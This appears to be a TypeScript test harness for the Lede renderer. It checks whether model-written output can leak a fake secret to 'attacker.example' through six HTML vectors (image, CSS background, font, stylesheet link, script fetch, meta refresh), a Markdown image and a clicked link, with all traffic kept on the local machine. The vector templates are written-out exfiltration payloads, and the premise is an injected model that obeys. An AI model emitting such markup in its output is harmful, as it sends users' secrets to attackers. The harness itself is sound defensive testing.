// Rerunnable exfiltration demo: `node demos/exfil/run.ts`. See README.md. It calls no model: the pages are fixed worst-case outputs.
import { execFileSync } from 'node:child_process';
import { readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import { createServer } from 'node:http';
import type { AddressInfo } from 'node:net';
import { fileURLToPath } from 'node:url';
import { chromium, resolveChrome } from '../../bench/src/shot.ts';
import { mapPool, POOL } from '../../bench/src/pool.ts';

export const SECRET = 'sk-demo-NOT-A-REAL-SECRET';
const HOST = 'attacker.example';
const dir = fileURLToPath(new URL('.', import.meta.url));
const cli = fileURLToPath(new URL('../../packages/cli/src/cli.ts', import.meta.url));
const require = createRequire(new URL('../../bench/src/shot.ts', import.meta.url));

export const EXIT_MISMATCH = 1;
export const EXIT_NO_CHROMIUM = 3;

/** The six markup vectors, one line each; `@@LEAK@@` is where the leak URL goes. Raw HTML and Lede's `html:` block carry the same line. */
const VECTORS = {
  img: '<img src="@@LEAK@@" width="1" height="1" alt="">',
  'css-background': '<p style="background:url(@@LEAK@@)">Details</p>',
  font: '<style>@font-face{font-family:x;src:url(@@LEAK@@)}body{font-family:x,sans-serif}</style>',
  'link-stylesheet': '<link rel="stylesheet" href="@@LEAK@@">',
  'script-fetch': '<script>fetch("@@LEAK@@",{mode:"no-cors"})</script>',
  'meta-refresh': '<meta http-equiv="refresh" content="0;url=@@LEAK@@">',
};
type Vector = keyof typeof VECTORS;

// The worst case: what a fully obedient model writes for brief.txt, in each form.
const TITLE = 'Incident summary';
const PARA = 'The database failover completed at 02:14. Customer impact was limited to the EU region.';
const SRC = {
  html: (v: Vector) => `<h1>${TITLE}</h1>\n<p>${PARA}</p>\n${VECTORS[v]}\n`,
  markdown: `# ${TITLE}\n\n${PARA}\n\n![](@@LEAK@@)\n`,
  ledeHtml: (v: Vector) => `# ${TITLE}\n${PARA}\n\nhtml: ${VECTORS[v]}\n`,
  ledeImage: `# ${TITLE}\n${PARA}\n\nimage @@LEAK@@ "status chart"\n`,
  ledeLink: `# ${TITLE}\n${PARA}\n\nSee the [full incident notes](@@LEAK@@).\n`,
};

interface Case {
  id: string;
  group: string;
  label: string;
  source: string;
  /** `raw` serves the source as HTML, `markdown` renders it first, `lede` compiles it with `flags`. */
  kind: 'raw' | 'markdown' | 'lede';
  flags?: string[];
  scheme?: 'http' | 'https';
  click?: boolean;
}

const VECTOR_NAMES = Object.keys(VECTORS) as Vector[];
const raw = (v: Vector): Case => ({ id: `raw-html/${v}`, group: 'Raw HTML', label: `HTML: ${v}`, source: SRC.html(v), kind: 'raw' });
const lede = (id: string, group: string, label: string, source: string, flags: string[] = [], extra: Partial<Case> = {}): Case => ({
  id,
  group,
  label,
  source,
  kind: 'lede',
  flags,
  ...extra,
});
const DEFAULT = 'Lede, default flags';
const ALLOW = 'Opt-out: --allow-remote';
const ARTIFACT = 'Opt-out: --artifact';

export const CASES: Case[] = [
  ...VECTOR_NAMES.map(raw),
  { id: 'markdown/image', group: 'Markdown', label: 'Markdown: ![](url) image', source: SRC.markdown, kind: 'markdown' },
  lede('lede/image', DEFAULT, 'Lede: image line', SRC.ledeImage),
  ...VECTOR_NAMES.map((v) => lede(`lede/html-${v}`, DEFAULT, `Lede: html: block, ${v}`, SRC.ledeHtml(v))),
  lede('lede/link-unclicked', DEFAULT, 'Lede: link, reader does not click', SRC.ledeLink),
  lede('lede/link-clicked', 'Not blocked', 'Lede: link, reader clicks it', SRC.ledeLink, [], { click: true }),
  lede('lede/allow-remote/image-https', ALLOW, 'Lede --allow-remote: image, https URL', SRC.ledeImage, ['--allow-remote']),
  lede('lede/allow-remote/image-http', ALLOW, 'Lede --allow-remote: image, http URL', SRC.ledeImage, ['--allow-remote'], {
    scheme: 'http',
  }),
  lede('lede/allow-remote/html-img', ALLOW, 'Lede --allow-remote: html: img', SRC.ledeHtml('img'), ['--allow-remote']),
  ...VECTOR_NAMES.map((v) =>
    lede(`lede/unsafe-html/${v}`, 'Opt-out: --unsafe-html', `Lede --unsafe-html: ${v}`, SRC.ledeHtml(v), ['--unsafe-html']),
  ),
  lede('lede/artifact/image', ARTIFACT, 'Lede --artifact: image line, no host policy', SRC.ledeImage, ['--artifact']),
  lede('lede/artifact/allow-remote/image', ARTIFACT, 'Lede --artifact --allow-remote: image', SRC.ledeImage, [
    '--artifact',
    '--allow-remote',
  ]),
  lede('lede/artifact/unsafe-html/script-fetch', ARTIFACT, 'Lede --artifact --unsafe-html: script', SRC.ledeHtml('script-fetch'), [
    '--artifact',
    '--unsafe-html',
  ]),
];

export interface Result {
  id: string;
  group: string;
  label: string;
  requests: number;
  leaked: boolean;
}

function page(c: Case): string {
  const url = `${c.scheme ?? 'https'}://${HOST}/leak?q=${SECRET}`;
  const text = c.source.replaceAll('@@LEAK@@', url);
  let out: string;
  if (c.kind === 'raw') out = `<!doctype html>\n<meta charset="utf-8">\n${text}`;
  else if (c.kind === 'markdown') {
    // markdown-it is a bench dependency. Its defaults (html off, images on) are what a typical chat host gives a reply.
    const MarkdownIt = require('markdown-it') as new () => { render(s: string): string };
    out = `<!doctype html>\n<meta charset="utf-8">\n${new MarkdownIt().render(text)}`;
  } else {
    out = execFileSync(process.execPath, [cli, 'build', '-', ...(c.flags ?? [])], {
      input: text,
      encoding: 'utf8',
      stdio: ['pipe', 'pipe', 'ignore'],
    });
    // A real artifact host wraps the fragment in its own page; here the wrapper is bare, so it adds no policy.
    if (c.flags?.includes('--artifact')) out = `<!doctype html>\n<meta charset="utf-8">\n${out}`;
  }
  // A row whose page never carries the URL would read 0 for the wrong reason. Every row that writes markup through (raw HTML,
  // Markdown, an opt-out, a link) must carry it; a default-flag row shares its source with one of these.
  const armed = c.kind !== 'lede' || c.click === true || (c.flags ?? []).some((f) => f === '--unsafe-html' || f === '--allow-remote');
  if (armed && !out.includes(url)) throw new Error(`${c.id}: the page does not carry the leak URL, so its count would test nothing`);
  return out;
}

type Browser = Awaited<ReturnType<typeof chromium.launch>>;

async function runCase(browser: Browser, c: Case, url: string): Promise<Result> {
  const ctx = await browser.newContext();
  let requests = 0;
  await ctx.route(
    (u) => u.hostname === HOST,
    (r) => {
      if (r.request().url().includes(SECRET)) requests++;
      return r.fulfill({ status: 200, contentType: 'text/html', body: 'ok' });
    },
  );
  const p = await ctx.newPage();
  await p.goto(url, { waitUntil: 'load' });
  if (c.click) await p.click('a');
  await p.waitForTimeout(500);
  await ctx.close();
  return { id: c.id, group: c.group, label: c.label, requests, leaked: requests > 0 };
}

/** Serves each case's page from 127.0.0.1 over http and opens it in Chromium. The attacker is `attacker.example`, answered by the browser's own routing, so nothing leaves the machine; the resolver rule makes any other host fail to resolve. */
export async function runDemo(exe: string): Promise<Result[]> {
  const pages = new Map<string, string>();
  const server = createServer((req, res) => {
    const body = pages.get(req.url ?? '');
    res.writeHead(body === undefined ? 404 : 200, { 'content-type': 'text/html; charset=utf-8' }).end(body ?? '');
  });
  await new Promise<void>((ok) => server.listen(0, '127.0.0.1', ok));
  const origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  const browser = await chromium.launch({ executablePath: exe, args: ['--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE 127.0.0.1'] });
  try {
    for (const [i, c] of CASES.entries()) pages.set(`/${i}`, page(c));
    // Each case counts requests in its own context, so the cases run side by side.
    return await mapPool(CASES, POOL, (c, i) => runCase(browser, c, `${origin}/${i}`));
  } finally {
    await browser.close();
    server.close();
  }
}

export const expected = (): Record<string, boolean> => JSON.parse(readFileSync(`${dir}expected.json`, 'utf8')) as Record<string, boolean>;

export function table(rs: Result[], want: Record<string, boolean>): string {
  const w = Math.max(...rs.map((r) => r.label.length));
  const lines = [`${'Case'.padEnd(w)}  Requests  Leaked  As expected`];
  let group = '';
  for (const r of rs) {
    if (r.group !== group) lines.push(`-- ${(group = r.group)}`);
    lines.push(
      `${r.label.padEnd(w)}  ${String(r.requests).padStart(8)}  ${(r.leaked ? 'yes' : 'no').padEnd(6)}  ${want[r.id] === r.leaked ? 'ok' : 'MISMATCH'}`,
    );
  }
  return lines.join('\n');
}

if (process.argv[1] === fileURLToPath(import.meta.url)) {
  const exe = resolveChrome();
  if (!exe) {
    console.error(
      'No Chromium found. Set CHROME to a Chromium or Chrome executable, or install one with `npx playwright-core install chromium`.',
    );
    process.exit(EXIT_NO_CHROMIUM);
  }
  const rs = await runDemo(exe);
  const want = expected();
  console.log(table(rs, want));
  const bad = rs.filter((r) => want[r.id] !== r.leaked).length + Object.keys(want).filter((k) => !rs.some((r) => r.id === k)).length;
  console.log(bad ? `\n${bad} result(s) differ from demos/exfil/expected.json` : '\nAll results match demos/exfil/expected.json');
  process.exit(bad ? EXIT_MISMATCH : 0);
}
